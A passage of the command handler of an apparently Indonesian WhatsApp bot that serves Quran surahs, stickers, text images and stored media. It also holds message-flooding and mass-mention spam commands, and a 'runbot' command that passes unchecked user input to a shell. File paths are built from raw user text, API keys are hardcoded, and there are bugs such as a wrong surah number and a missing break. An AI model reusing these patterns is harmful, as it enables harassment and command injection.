				   quran = `Surah Al-Qur\`an Nomor: 104\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/104?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-fil':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=105&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 105\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/105?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'quraisy':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=106&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 106\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/106?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-maun':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=21&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 107\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/107?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'panggil':
					
					if (!isOwner && !ben.key.fromMe) return
					var gh = body.slice(8)
			var okp = gh.split('|')[1]
			var okg = gh.split('|')[2]
			if (Number(okg) >= 50) return reply('Kebanyakan!')
					mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
					for (let i = 0; i < okg; i++) {
						benny.sendMessage(from, `${okp} @${mentioned.split('@')[0]}`, MessageType.text, {contextInfo: { mentionedJid: [mentioned]}})
						}
						break
						case 'culik':
						teks = body.slice(7)
						teks1 = teks.split('|')[0]
						teks2 = teks.split('|')[1]
						if (args.length > 2) mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]; linkgr = args[1]
						if (args.length < 2) mentioned = ben.message.extendedTextMessage.contextInfo.participant; linkgr = args[0]
						var opos = await groupInfo(linkgr)
						benny.groupAdd(opos.id, [mentioned])
						break
						case 'creategroup':
						mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
						teks = body.slice(13)
						teks1 = teks.split('|')[0]
						anu = await benny.groupCreate(teks1, mentioned)
						console.log(anu)
						break
						case 'spamtag':
						if (!ben.key.fromMe && !isGroupAdmins) return reply(mesa.only.admin)
						if (isGroup && budy.length < 13) {
							teks = Number(args[0])
							teks1 = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
							gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!Number(teks)) return reply('Jumlah harus berupa angka!')
if (Number(teks) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < teks; i++) {
	  benny.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
			} else if (isGroup && budy.length > 13) {
teks = body.slice(9)
teks1 = teks.split('|')[0]
teks2 = teks.split('|')[1]
gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!teks1) teks1 = '-'
if (!Number(teks2)) return reply('Jumlah harus berupa angka!')
if (Number(teks2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < teks2; i++) {
	  benny.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
						} else if (!isGroup) {
							bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(9)
						bodo1 = bodo.split('|')[0]
						bodo2 = bodo.split('|')[1]
				teks = bodo1.replace(bodom, '')
				orange = `${teks}@s.whatsapp.net`
		if (!Number(bodo2)) return reply('Jumlah harus berupa angka!')
if (Number(bodo2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < bodo2; i++) {
	  benny.sendMessage(from, `@${orange.split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [orange]}})
	  }
						}			
	  break
	  case 'spamto':
if (!isOwner && !ben.key.fromMe) return
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
oi3 = teks.split('|')[2]
if (Number(oi3) >= 50) return reply('Kebanyakan!')
if (!Number(oi3)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi3; i++) {
	  benny.sendMessage(oi1, `${oi2}`, MessageType.text, {quoted: adadeh})
	  }
	  break
case 'spam':
if (!isOwner && !ben.key.fromMe) return
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(6)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  benny.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  benny.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  benny.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  benny.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
	delb = await benny.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  benny.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
case 'al-kausar':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=108&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 108\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/108?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-kafirun':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=109&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 109\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/109?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'an-nashr':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=110&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 110\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/110?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-lahab':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=111&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 111\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/111?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-ikhlas':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=112&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 112\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/112?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-falaq':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=113&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 113\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/113?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'an-nas':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=114&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 114\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/114?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'reverse':

    benny.updatePresence(from, Presence.composing) 
	if (!isQuotedVideo) return reply('itu video bruh?:V')
	reply(mess.wait)
							encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await benny.downloadAndSaveMediaMessage(encmedia)
	anu = await reverseVideoFile(media)
	console.log(anu)
	benny.sendMessage(from, anu, video, {quoted: adadeh, caption: 'Neh..'})
	break
	case 'tomp3':

    benny.updatePresence(from, Presence.composing) 
	if (!isQuotedVideo) return reply('itu video bruh?:V')
	reply(mess.wait)
							encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await benny.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp4')
	exec(`ffmpeg -i ${media} ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return reply('Yahh emrror bruh:(')
	buffer = fs.readFileSync(ran)
    benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: adadeh})
	fs.unlinkSync(ran)
	})
	break	
	case 'vntovid':
	case 'audtovid':

    benny.updatePresence(from, Presence.composing) 
	if (!isQuotedAudio) return reply('itu audio bruh?:V')
	reply(mess.wait)
							encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await benny.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp4')
	exec(`ffmpeg -loop 1 -i ./korban.jpg -i ${media} -shortest -c:a copy ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return reply('Yahh emrror bruh:(')
	buffer = fs.readFileSync(ran)
    benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: adadeh})
	fs.unlinkSync(ran)
	})
	break	
case 'blackpink':case 'neon':case 'greenneon':case 'advanceglow':case 'futureneon':case 'sandwriting':case 'sandsummer':case 'sandengraved':case 'metaldark':case 'neonlight':case 'holographic':case 'text1917':case 'minion':case 'deluxesilver':case 'newyearcard':case 'bloodfrosted':case 'halloween':case 'jokerlogo':case 'fireworksparkle':case 'natureleaves':case 'bokeh':case 'toxic':case 'strawberry':case 'box3d':case 'roadwarning':case 'breakwall':case 'icecold':case 'luxury':case 'cloud':case 'summersand':case 'horrorblood':case 'thunder2':case 'christmas':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Benny Ganteng`)
                    teks = args.join(" ")
                    buffer = await getBaper(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=YunitaGanteng&text=${teks}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break
	
case 'ttp': // Credits Ramlan ID
		
		                    pngttp = './temp/ttp.png'
							webpng = getRandom('.webp')
							const ttptext = body.slice(5)
							require('./lib/exif').createExif(namabot, '')
							fetch(`https://api.areltiyan.site/sticker_maker?text=${encodeURIComponent(ttptext)}`, { method: 'GET'})
							.then(async res => {
							const ttptxt = await res.json()
							base64Img.img(ttptxt.base64, 'temp', 'ttp', function(err, filepath) {
							if (err) return console.log(err);
							exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
							exec(`webpmux -set exif ./src/data.exif ${webpng} -o ${webpng}`, async (error) => {
							buffer = fs.readFileSync(webpng)
							benny.sendMessage(from, buffer, sticker, { quoted: adadeh})
							fs.unlinkSync(webpng)
							fs.unlinkSync(pngttp)
							})
							})
							})
							});
							break	
							case 'ttp2':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
                    buffer = `http://api.lolhuman.xyz/api/ttp?apikey=${lolkey}&text=${encodeURIComponent(teks)}`
                    sendStickerUrl(from, buffer)
                    break
					case 'ttp3':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
                    buffer = `http://api.lolhuman.xyz/api/ttp2?apikey=${lolkey}&text=${encodeURIComponent(teks)}`
                    sendStickerUrl(from, buffer)
                    break
					case 'ttp4':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
                    buffer = `http://api.lolhuman.xyz/api/ttp3?apikey=${lolkey}&text=${encodeURIComponent(teks)}`
                    sendStickerUrl(from, buffer)
                    break
					case 'ttp5':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
                    buffer = `http://api.lolhuman.xyz/api/ttp4?apikey=${lolkey}&text=${encodeURIComponent(teks)}`
                    sendStickerUrl(from, buffer)
                    break
					case 'ttp6':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
                    buffer = `https://api.xteam.xyz/ttp?file&text=${encodeURIComponent(teks)}`
                    sendStickerUrl(from, buffer)
                    break
					case 'ttp7':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Benny Ganteng`)
                    teks = body.slice(6)
					teks1 = teks.split('|')[0]
					teks2 = teks.split('|')[1]
                    buffer = `https://api.vhtear.com/textmaker?text=${encodeURIComponent(teks1)}&warna=${teks2}&apikey=YunitaGanteng`
                    sendStickerUrl(from, buffer)
break
case 'ttp8':
media = await getBaper(`https://pecundang.herokuapp.com/api/texttopng2?teks=${encodeURIComponent(body.slice(6))}`)
fs.writeFileSync('ttp8.png', media)
							ran = getRandom('.webp')
							require('./lib/exif.js').createExif(namabot, '')
							await ffmpeg('ttp8.png')
									.input('ttp8.png')
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync('ttp8.png')
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./src/sticker/data.exif ${ran} -o ${ran}`, async (error) => {
											if (error) return reply(mess.error.api)
											benny.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: adadeh})
											fs.unlinkSync('ttp8.png')	
											fs.unlinkSync(ran)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(ran)
case 'shadow':
                case 'cup':case 'romance':case 'smoke':case 'burnpaper':case 'lovemessage':case 'undergrass':case 'love':case 'coffe':case 'woodheart':case 'woodenboard':case 'summer3d':case 'wolfmetal':case 'nature3d':case 'underwater':case 'golderrose':case 'summernature':case 'letterleaves':case 'glowingneon':case 'fallleaves':case 'flamming':case 'harrypotter':case 'carvedwood':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Benny Ganteng`)
                    teks = args.join(" ")
                    buffer = await getBaper(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${teks}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break

                    // Ephoto 360 //
                case 'wetglass':case 'multicolor3d':case 'watercolor':case 'luxurygold':case 'galaxywallpaper':case 'lighttext':case 'beautifulflower':case 'puppycute':case 'royaltext':case 'heartshaped':case 'birthdaycake':case 'galaxystyle':case 'hologram3d':case 'greenneon':case 'glossychrome':case 'greenbush':case 'metallogo':case 'noeltext':case 'glittergold':case 'textcake':case 'starsnight':case 'wooden3d':case 'textbyname':case 'writegalacy':case 'galaxybat':case 'snow3d':case 'birthdayday':case 'goldplaybutton':case 'silverplaybutton':case 'freefire':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Benny Ganteng`)
                    teks = args.join(" ")
                    buffer = await getBaper(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${teks}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break							
case 'getsticker':

	namastc = body.slice(12)
	result = fs.readFileSync(`./src/sticker/${namastc}.webp`)
	benny.sendMessage(from, result, sticker, {quoted: adadeh})
	break
case 'sticktag':

if (!isGroup) return reply(mess.only.group)
if (isQuotedSticker) {
	members_id = []
		for (let mem of groupMembers){
					members_id.push(mem.jid)
					}
				encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
				benny.sendMessage(from, anu, sticker, {contextInfo: {"mentionedJid": members_id}})
} else if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							members_id = []
		for (let mem of groupMembers){
					members_id.push(mem.jid)
					}
							ran = getRandom('.webp')
							await ffmpeg(`./${media}`)
								.input(media)
								.on('start', function (cmd) {
									console.log(`Started : ${cmd}`)
								})
								.on('error', function (err) {
									console.log(`Error : ${err}`)
									fs.unlinkSync(media)
									reply(mess.error.stick)
								})
								.on('end', function () {
								console.log('Finish')
									if (error) return reply(mess.error.stick)
                            	 benny.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: {"mentionedJid": members_id}, quoted: adadeh})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						} else if (args.length > 1) {
							members_id = []
		for (let mem of groupMembers){
					members_id.push(mem.jid)
					}
							pngttp = './temp/ttp.png'
							webpng = './temp/ttp.webp'
							const ttptext = body.slice(10)
							require('./lib/exif').createExif(namabot, '')
							fetch(`https://api.areltiyan.site/sticker_maker?text=${ttptext}`, { method: 'GET'})
							.then(async res => {
							const ttptxt = await res.json()
							base64Img.img(ttptxt.base64, 'temp', 'ttp', function(err, filepath) {
							if (err) return console.log(err);
							exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
							exec(`webpmux -set exif ./src/data.exif ${webpng} -o ${webpng}`, async (error) => {
							buffer = fs.readFileSync(webpng)
							benny.sendMessage(from, buffer, sticker, {contextInfo: {"mentionedJid": members_id}, quoted: adadeh})
							fs.unlinkSync(webpng)
							fs.unlinkSync(pngttp)
							})
							})
							})
							});
						} else {
							reply(`Reply sticker/gambar dengan tulisan\n${prefix}`)
						}
	break
	case 'imagetag':

if (!isGroup) return reply(mess.only.group)
if ((isMedia || isQuotedImage) && args.length === 0) {
	anu = body.slice(10)
	members_id = []
		for (let mem of groupMembers){
					members_id.push(mem.jid)
					}
				encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				ano = await imageToBase64(media)
				buffer = await Buffer.from(ano, 'base64')
				benny.sendMessage(from, buffer, image, {contextInfo: {"mentionedJid": members_id}})
}
	break
	case 'vntag':
				
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					members_id = []
					for (let b of groupMembers) {
						members_id.push(b.jid)
					}
					hah = fs.readFileSync(media)
						benny.sendMessage(from, hah, audio, {contextInfo: {"mentionedJid": members_id}, mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(media)
				break
case 'stickerlist':
case 'liststicker':
	teks = 'Sticker List :\n'
	for (let awokwkwk of setiker) {
		teks += `- ${awokwkwk}\n`
	}
	teks += `Total : ${setiker.length}`
	benny.sendMessage(from, teks.trim(), extendedText, {quoted: adadeh, contextInfo: {"mentionedJid": setiker}})
	break
case 'addsticker':

	if (!isQuotedSticker) return reply('Reply stiker nya')
	svst = body.slice(12)
	if (!svst) return reply('Nama sticker nya apa?')
	boij = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	delb = await benny.downloadMediaMessage(boij)
	setiker.push(`${svst}`)
	fs.writeFileSync(`./src/sticker/${svst}.webp`, delb)
	fs.writeFileSync('./src/stik.json', JSON.stringify(setiker))
	benny.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: adadeh})
	break
				case 'runbot':
				exec(`node index ${args[0]}`, (err, stdout) => {
					if (err) return benny.sendMessage(from, `Error:\n${err}`, {quoted: adadeh})
					if (stdout) {
						benny.sendMessage(from, stdout, {quoted: adadeh})
					}
				})
				break
case 'addvn':

	if (!isQuotedAudio) return reply('Reply vnnya blokk!')
	svst = body.slice(7)
	if (!svst) return reply('Nama audionya apa su?')
	boij = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	delb = await benny.downloadMediaMessage(boij)
	audionye.push(`${svst}`)
	fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)
	fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
	benny.sendMessage(from, `Sukses Menambahkan Vn\nCek dengan cara ${prefix}listvn`, MessageType.text, {quoted: adadeh})
	break
case 'getvn':

	namastc = body.slice(7)
	buffer = fs.readFileSync(`./src/audio/${namastc}.mp3`)
	benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: adadeh, ptt: true})
	break
case 'listvn':
case 'vnlist':

	teks = 'List Vn:\n'
	for (let awokwkwk of audionye) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `Total : ${audionye.length}`
	benny.sendMessage(from, teks.trim(), extendedText, {quoted: adadeh, contextInfo: {"mentionedJid": audionye}})
	break
case 'addimage':

	if (!isQuotedImage) return reply('Reply imagenya blokk!')
	svst = body.slice(10)
	if (!svst) return reply('Nama imagenya apa su?')
	boij = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	delb = await benny.downloadMediaMessage(boij)
	imagenye.push(`${svst}`)
	fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)
	fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
	benny.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, {quoted: adadeh})
	break
case 'getimage':

	namastc = body.slice(10)
	buffer = fs.readFileSync(`./src/image/${namastc}.jpeg`)
	benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `*Result From Database* : ${namastc}.jpeg`})
	break
case 'imagelist':
case 'listimage':

	teks = 'List Video:\n'
	for (let awokwkwk of imagenye) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `Total : ${imagenye.length}`
	benny.sendMessage(from, teks.trim(), extendedText, {quoted: adadeh, contextInfo: {"mentionedJid": imagenye}})
	break
case 'addvideo':

	if (!isQuotedVideo) return reply('Reply videonya blokk!')
	svst = body.slice(10)
	if (!svst) return reply('Nama videonya apa su?')
	boij = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	delb = await benny.downloadMediaMessage(boij)
	videonye.push(`${svst}`)
	fs.writeFileSync(`./src/video/${svst}.mp4`, delb)
	fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
	benny.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, {quoted: adadeh})
	break
case 'getvideo':

	namastc = body.slice(10)
	buffer = fs.readFileSync(`./src/video/${namastc}.mp4`)
	benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: adadeh})
	break
case 'listvideo':
case 'videolist':

	teks = 'List Video:\n'
	for (let awokwkwk of videonye) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `Total : ${videonye.length}`
	benny.sendMessage(from, teks.trim(), extendedText, {quoted: adadeh, contextInfo: {"mentionedJid": videonye}})
	break
case 'howax':
case 'hoax':
case 'howak':
case 'hoak':

	benny.updatePresence(from, Presence.composing) 
	data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infohoax`)
	teks = '────────────────────\n\n'
	for (let i of data.result) {
		teks += `*Title* : ${i.title}\n*Link* : ${i.link}\n*Tag* : ${i.tag}\n\n────────────────────\n`
	}
	reply(teks.trim())
	break
case 'deface':
if (!isUrl(args[0])) return reply('Link tidak valid!')
var gas = body.slice(8)
try {
					ppimg = await benny.getProfilePicture(sender)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
					var imgbb = await getBaper(ppimg)
